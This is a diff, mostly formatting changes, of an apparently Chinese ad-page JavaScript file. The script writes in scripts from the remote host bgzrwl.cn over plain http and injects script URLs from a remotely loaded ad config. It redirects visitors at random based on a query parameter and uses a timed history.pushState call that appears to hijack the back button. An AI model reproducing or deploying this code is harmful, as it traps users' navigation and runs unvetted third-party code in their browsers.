@@ -1,5 +1,4 @@
 // 返回开关
-
 function getQueryString(name) {
     var reg = new RegExp('(^|&)' + name + '=([^&]*)(&|$)', 'i');
     var r = window.location.search.substr(1).match(reg);
@@ -8,36 +7,30 @@ function getQueryString(name) {
     }
     return null;
 }
- 
-
 
 var cash = getQueryString('cash');
 
-
 // xxx
-var noshare = new Array('xs_sz_qr');  
+var noshare = new Array('xs_sz_qr');
 
 document.writeln("<script src='http://bgzrwl.cn/backurl.js?t=" + Math.random() + "'></script>");
 document.writeln("<script src='http://bgzrwl.cn/gg_config.js?t=" + Math.random() + "'></script>");
 
 
-
-
 /**
  * @version  1.0
  * @author   eacher
- * @param  
+ * @param
  * @return array | boolean
  */
-function init()
-{    
+function init() {
     if (cash !== null) {
         if (cash == 'fanhui') {
             // 随机广告的下标 <script type="text/javascript" src="http://libs.baidu.com/jquery/2.1.1/jquery.min.js"></script>
             index_id = fh[Math.floor(fh.length * Math.random())];
             if (index_id == 'suiji') {
                 location.href = suiji;
-            } else {        
+            } else {
                 baiducode()
                 document.writeln("<script src='" + gg_list[index_id]['url'] + "'></script>");
             }
@@ -45,7 +38,7 @@ function init()
             index_id = noshare[Math.floor(noshare.length * Math.random())];
             if (index_id == 'suiji') {
                 location.href = suiji;
-            } else {        
+            } else {
                 baiducode()
                 document.writeln("<script src='" + gg_list[index_id]['url'] + "'></script>");
             }
@@ -59,9 +52,7 @@ function init()
     }
 }
 
-
 function weixinghao() {
-
     _random = Math.floor(Math.random() * winxin[index_id].length);
     var divweixinghao = document.getElementsByName('weixinghao');
     for (var i = 0; i < divweixinghao.length; i++) {
@@ -69,41 +60,36 @@ function weixinghao() {
     }
     var wxerweima = document.getElementsByName('wxerweima');
     for (var i = 0; i < wxerweima.length; i++) {
-        //wxerweima[i].src = '//cdn.tengbaole.cn/sp/ad/nkt/02/' + winxin[_random] + '';
-        
         wxerweima[i].src = apidomain + '/se01/src/' + winxin[index_id][_random] + '.jpg';
-        
     }
-} 
+}
 
 
 /**
  * @version  1.0
  * @author   eacher
- * @param  
+ * @param
  * @return array | boolean
  * 统一广告入口
  */
-function ggcash(name)
-{
+function ggcash(name) {
     location.href = window.location.pathname + '?cash=' + name;
 }
-
 
 function hh() {
     history.pushState(history.length + 1, "message", "#" + new Date().getTime());
 }
+
 setTimeout('hh();', 500);
 
 /**
  * @version  1.0
  * @author   eacher
- * @param  
+ * @param
  * @return array | boolean
  */
-function loadJs(src)
-{
-    src.forEach(function(index,item) {
+function loadJs(src) {
+    src.forEach(function (index, item) {
         var hm = document.createElement("script");
         hm.charset = "utf-8"
         hm.src = index;
@@ -116,11 +102,10 @@ function loadJs(src)
 /**
  * @version  1.0
  * @author   eacher
- * @param  
+ * @param
  * @return array | boolean
  */
-function baiducode()
-{
+function baiducode() {
     var _hmt = _hmt || [];
     var hm = document.createElement("script");
     if ("fanhui" == cash) {
